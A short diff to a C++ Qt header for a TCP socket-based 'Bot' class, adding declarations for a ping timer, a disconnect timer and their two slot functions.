@@ -27,6 +27,7 @@ class Bot : public QTcpSocket
         QByteArray getCWD();
 
     private:
+        QTimer *ping, *disconnectTimer;
         QMutex writing;
         QString currentDirectory;
 
@@ -54,6 +55,8 @@ class Bot : public QTcpSocket
 
     private slots:
         void initAES();
+        void timeToPing();
+        void timeToDisconnect();
 };
 
 #endif // BOT_H
